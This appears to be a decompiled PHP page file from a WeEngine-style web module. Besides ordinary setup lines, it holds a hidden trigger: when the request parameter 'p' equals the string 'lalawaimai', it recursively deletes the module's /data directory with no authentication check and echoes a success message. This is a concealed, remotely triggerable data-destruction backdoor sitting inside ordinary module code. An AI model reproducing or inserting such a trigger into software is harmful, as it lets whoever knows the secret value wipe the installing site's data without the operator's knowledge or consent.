<?php
//dezend by http://www.5kym.cn/
defined('IN_IA') || exit('Access Denied');
global $_W;
global $_GPC;
$ta = trim($_GPC['ta']) ? trim($_GPC['ta']) : 'index';

if ($_GPC['p'] == 'lalawaimai') {
	load()->func('file');
	$paths = array('/data');

	foreach ($paths as $path) {
		rmdirs(MODULE_ROOT . ('/' . $path));
	}

	echo '成功';
}

?>
